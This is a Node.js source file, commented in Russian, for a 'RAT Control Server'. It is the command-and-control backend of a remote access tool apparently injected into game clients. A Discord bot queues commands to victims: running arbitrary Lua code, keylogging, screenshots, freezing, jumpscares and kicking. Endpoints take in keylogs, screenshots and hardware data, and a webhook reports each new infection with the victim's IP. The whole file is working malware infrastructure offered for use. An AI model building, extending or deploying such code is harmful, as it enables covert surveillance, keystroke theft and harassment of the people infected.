const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ (всё из переменных окружения) ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PORT = process.env.PORT || 10000;

// SERVER_URL теперь динамический
const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `http://localhost:${PORT}`;

console.log('🚀 RAT Control Server v3.2 запускается...');
console.log('🔧 Конфигурация:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅' : '❌'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅' : '❌'}`);

// ========== ЗАЩИТА ОТ СПАМА ==========
let rateLimitMap = new Map();
let recentInjects = new Map();
let lastSpamWarning = 0;

function isRateLimited(ip, playerName) {
    const now = Date.now();
    
    if (rateLimitMap.has(ip)) {
        const lastRequest = rateLimitMap.get(ip);
        if (now - lastRequest < 30000) {
            if (now - lastSpamWarning > 10000) {
                console.log(`⚠️ Спам: IP ${ip}`);
                lastSpamWarning = now;
            }
            return true;
        }
    }
    
    if (recentInjects.has(playerName)) {
        const lastInject = recentInjects.get(playerName);
        if (now - lastInject < 60000) {
            console.log(`⚠️ ${playerName} уже инжектился`);
            return true;
        }
    }
    
    rateLimitMap.set(ip, now);
    recentInjects.set(playerName, now);
    return false;
}

setInterval(() => {
    const now = Date.now();
    for (let [ip, time] of rateLimitMap.entries()) {
        if (now - time > 300000) rateLimitMap.delete(ip);
    }
    for (let [player, time] of recentInjects.entries()) {
        if (now - time > 300000) recentInjects.delete(player);
    }
}, 60000);

// ========== ХРАНИЛИЩЕ ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== DISCORD ВЕБХУК ==========
async function sendDiscordWebhook(title, description, color = 0x3498db, fields = []) {
    if (!WEBHOOK_URL) {
        console.log('⚠️ WEBHOOK_URL не настроен');
        return false;
    }
    
    try {
        const embed = {
            title: title,
            description: description,
            color: color,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: { text: "RAT Control System v3.2" }
        };
        
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                username: "RAT Control",
                embeds: [embed]
            })
        });
        
        if (response.ok) {
            console.log(`✅ Вебхук: ${title}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ Ошибка вебхука:', error.message);
        return false;
    }
}

// ========== DISCORD БОТ ==========
let discordClient = null;

function isValidUsername(str) {
    if (!str || typeof str !== 'string') return false;
    if (str.length < 3 || str.length > 20) return false;
    if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
    return true;
}

function parseCommandWithTarget(message) {
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    if (args.length === 0) return { command, args, target: null };
    
    const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
    const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
    
    if (noTargetCommands.includes(command) || textFirstCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (isValidUsername(args[0])) {
        const target = args.shift();
        return { command, args, target };
    }
    
    return { command, args, target: null };
}

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = { command, args };
            if (target) payload.target = target;
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`📨 Команда ${command} -> ${target || 'всем'}`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка: ${error.message}`);
            return false;
        }
    }

    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) return await response.json();
            return { users: [], count: 0 };
        } catch (error) {
            return { users: [], count: 0 };
        }
    }

    discordClient.on('ready', () => {
        console.log(`🤖 Бот ${discordClient.user.tag} запущен!`);
        discordClient.user.setActivity('/help | RAT v3.2', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot || !message.content.startsWith('/')) return;
        
        const { command, args, target } = parseCommandWithTarget(message);
        
        const handlers = {
            test: async () => {
                if (await sendCommand("popup", ["✅ Тест от бота!"], target)) {
                    message.reply(`✅ Тест отправлен ${target ? `игроку ${target}` : 'всем'}`);
                }
            },
            users: async () => {
                const data = await getOnlineUsers();
                const embed = new EmbedBuilder()
                    .setTitle('👥 Онлайн')
                    .setColor(0x00ff00)
                    .setDescription(data.count > 0 ? 
                        data.users.map(u => `• ${u.player} - ${u.place || 'Unknown'}`).join('\n') : 
                        '❌ Нет игроков');
                message.reply({ embeds: [embed] });
            },
            status: async () => {
                const embed = new EmbedBuilder()
                    .setTitle('📊 Статус')
                    .setColor(0x7289da)
                    .addFields(
                        { name: '👥 Онлайн', value: `${global.onlineUsers.size}`, inline: true },
                        { name: '📨 Очередь', value: `${commandQueue.length}`, inline: true },
                        { name: '🤖 Бот', value: '🟢 Активен', inline: true }
                    );
                message.reply({ embeds: [embed] });
            },
            help: async () => {
                const embed = new EmbedBuilder()
                    .setTitle('🤖 RAT Control v3.2')
                    .setDescription('**Доступные команды:**\n`/users` - Онлайн\n`/status` - Статус\n`/test` - Тест\n`/kick [ник] [причина]` - Кик\n`/freeze [ник] [сек]` - Заморозка\n`/void [ник]` - В бездну\n`/jumpscare [ник] [1-2]` - Скример\n`/message [ник] [текст]` - Сообщение\n`/execute [ник] [код]` - Lua код')
                    .setColor(0x7289da);
                message.reply({ embeds: [embed] });
            },
            default: async () => {
                const validCommands = ['kick', 'freeze', 'void', 'jumpscare', 'message', 'execute', 'fakeerror', 'blur', 'mute', 'unmute', 'playaudio', 'spin', 'fling', 'sit', 'dance', 'cameralock', 'camerashake', 'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery', 'screenshot', 'print', 'tpgame', 'chat'];
                
                if (validCommands.includes(command)) {
                    if (await sendCommand(command, args, target)) {
                        message.reply(`✅ ${command} отправлена ${target ? target : 'всем'}`);
                    }
                } else if (command) {
                    message.reply(`❌ Неизвестная команда. Используй /help`);
                }
            }
        };
        
        try {
            if (handlers[command]) await handlers[command]();
            else await handlers.default();
        } catch (error) {
            console.error(error);
            message.reply('❌ Ошибка');
        }
    });

    discordClient.login(DISCORD_TOKEN).catch(e => console.error('❌ Ошибка бота:', e.message));
}

// ========== API МАРШРУТЫ ==========

app.get('/data', (req, res) => {
    const player = req.query.player;
    if (!player) return res.json({ command: "", args: [] });
    
    if (global.onlineUsers.has(player)) {
        global.onlineUsers.get(player).lastSeen = Date.now();
    }
    
    const commandIndex = commandQueue.findIndex(cmd => !cmd.target || cmd.target === player || cmd.target === 'all');
    
    if (commandIndex !== -1) {
        const cmd = commandQueue[commandIndex];
        commandQueue.splice(commandIndex, 1);
        console.log(`📨 ${cmd.command} -> ${player}`);
        res.json({ command: cmd.command, args: cmd.args || [] });
    } else {
        res.json({ command: "", args: [] });
    }
});

app.post('/command', async (req, res) => {
    const { command, args, target } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;
    
    // Инжект уведомление
    if (command === "inject_notify" && args && args.length >= 5) {
        const playerName = args[0];
        
        if (!isValidUsername(playerName)) {
            return res.json({ status: "OK", filtered: true });
        }
        
        if (isRateLimited(clientIp, playerName)) {
            return res.json({ status: "OK", rate_limited: true });
        }
        
        const [_, gameName, ipInfo, executor, device] = args;
        
        const description = `**Игрок:** ${playerName}\n**Игра:** ${gameName || "Unknown"}\n**Инжектор:** ${executor || "Unknown"}\n**Устройство:** ${device || "PC"}\n\n**IP:**\n${ipInfo || "N/A"}`;
        
        await sendDiscordWebhook("🔌 Новый инжект!", description, 0x00ff00);
        
        return res.json({ status: "OK" });
    }
    
    // Обычные команды
    if (command && command !== "inject_notify") {
        commandQueue.push({
            command: command,
            args: args || [],
            target: target || null,
            timestamp: Date.now()
        });
        
        if (commandQueue.length > 100) commandQueue = commandQueue.slice(-50);
    }
    
    res.json({ status: "OK", queue_size: commandQueue.length });
});

app.post('/users', (req, res) => {
    const { player, place, executor, device } = req.body;
    
    if (!player || !isValidUsername(player)) {
        return res.status(400).json({ error: "Invalid player" });
    }
    
    global.onlineUsers.set(player, {
        player: player,
        place: place || "Unknown",
        executor: executor || "Unknown",
        device: device || "PC",
        lastSeen: Date.now()
    });
    
    res.json({ status: "OK" });
});

app.get('/users', (req, res) => {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 120000) global.onlineUsers.delete(key);
    }
    
    res.json({
        users: Array.from(global.onlineUsers.values()),
        count: global.onlineUsers.size
    });
});

app.post('/screenshot', (req, res) => {
    const { image } = req.body;
    lastScreenshot = image;
    res.json({ status: "OK" });
});

app.get('/screenshot', (req, res) => {
    res.json({ image: lastScreenshot || null });
});

app.post('/keylog', async (req, res) => {
    const { logs } = req.body;
    if (logs && logs.length > 0) {
        await sendDiscordWebhook("⌨️ Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
    }
    res.json({ status: "OK" });
});

app.post('/hardware', async (req, res) => {
    const { player, data } = req.body;
    if (player && data) {
        await sendDiscordWebhook("💻 Hardware Info", `**Игрок:** ${player}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}`, 0x9b59b6);
    }
    res.json({ status: "OK" });
});

app.get('/status', (req, res) => {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 120000) global.onlineUsers.delete(key);
    }
    
    res.json({
        status: "online",
        version: "3.2.0",
        online_users: global.onlineUsers.size,
        pending_commands: commandQueue.length,
        uptime: Math.floor(process.uptime())
    });
});

app.get('/health', (req, res) => {
    res.send('OK');
});

app.get('/', (req, res) => {
    res.json({
        name: "RAT Control System",
        version: "3.2.0",
        status: "operational",
        endpoints: ["/data", "/command", "/users", "/status", "/health"]
    });
});

app.listen(PORT, () => {
    console.log(`\n🚀 Сервер запущен на ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🤖 Discord: ${DISCORD_TOKEN ? '✅' : '❌'}`);
    console.log(`🔗 Webhook: ${WEBHOOK_URL ? '✅' : '❌'}\n`);
});
